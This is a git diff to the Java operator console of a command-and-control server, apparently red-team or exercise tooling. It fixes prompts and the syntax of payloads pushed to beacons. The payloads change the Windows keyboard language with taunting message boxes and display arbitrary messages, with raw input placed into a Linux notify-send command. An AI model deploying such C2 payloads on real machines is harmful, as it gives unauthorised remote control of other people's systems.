@@ -9,8 +9,6 @@ import java.util.Scanner;
 import java.util.Queue;
 import java.util.HashSet;
 import java.util.Arrays;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
 
 public class C2ServerUserHandler implements Runnable{
     private String RED = "\u001B[31m";
@@ -37,9 +35,6 @@ public class C2ServerUserHandler implements Runnable{
     // Queue of messages to be printed to the CLI
     private Queue<String> messageQueue;
 
-    // Regex Pattern to match to IP Addresses
-    private Pattern ipAddressPattern;
-
     /**
      * Class to handle input from the user controlling the C2
      * and send it back to the C2 Server.
@@ -53,7 +48,6 @@ public class C2ServerUserHandler implements Runnable{
         this.beaconsWaitingForMFA = new HashMap<>();
         this.currentUserPath = "";
         this.messageQueue = new LinkedList<String>();
-        ipAddressPattern = Pattern.compile("^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", Pattern.CASE_INSENSITIVE);
     }
 
     /**
@@ -361,7 +355,7 @@ public class C2ServerUserHandler implements Runnable{
                     os = os.toLowerCase().strip();
                     if(os.equals("windows") || os.equals("linux")){
                         System.out.println("All " + os + " or a specific IP (Enter 'All'/'x.x.x.x')");
-                        System.out.println(" >> ");
+                        System.out.print(" >> ");
                         target = userInputScanner.nextLine();
                         target = target.toLowerCase().strip();
                     } else {
@@ -385,7 +379,7 @@ public class C2ServerUserHandler implements Runnable{
                     windowsCommands += "[System.Windows.MessageBox]::Show('Have Fun Learning French MF');";
                     windowsCommands += "Start-Sleep -Seconds 60;";
                     windowsCommands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
-                    windowsCommands += "Set-WinUserLanguageList en-US; -force";
+                    windowsCommands += "Set-WinUserLanguageList en-US -force";
 
                     // Linux
                     linuxCommands = "";
@@ -415,10 +409,10 @@ public class C2ServerUserHandler implements Runnable{
                     // TODO Figure out how to mess with Linux Keyboard
                 } else if (userAttackChainChoice.equals("4")){
                     // Change it back to english in case we mess up
-                    
+
                     // Windows
                     windowsCommands = "";
-                    windowsCommands += "Set-WinUserLanguageList en-US; -force;";
+                    windowsCommands += "Set-WinUserLanguageList en-US -force;";
                     windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                     windowsCommands += "[System.Windows.MessageBox]::Show('Sorry about that here's english')";
 
@@ -428,6 +422,7 @@ public class C2ServerUserHandler implements Runnable{
                 } else if (userAttackChainChoice.equals("5")){
                     // Send a message box
                     System.out.println("Enter A Message to Display: ");
+                    System.out.print(" >> ");
                     String message = userInputScanner.nextLine();
                     
                     // Windows
@@ -437,7 +432,7 @@ public class C2ServerUserHandler implements Runnable{
 
                     // Linux
                     linuxCommands = "";
-                    linuxCommands += "notify-send" + message;
+                    linuxCommands += "notify-send " + message;
                 }else if (userAttackChainChoice.equals("6")){
                     currentUserPath = "";
                 } else {
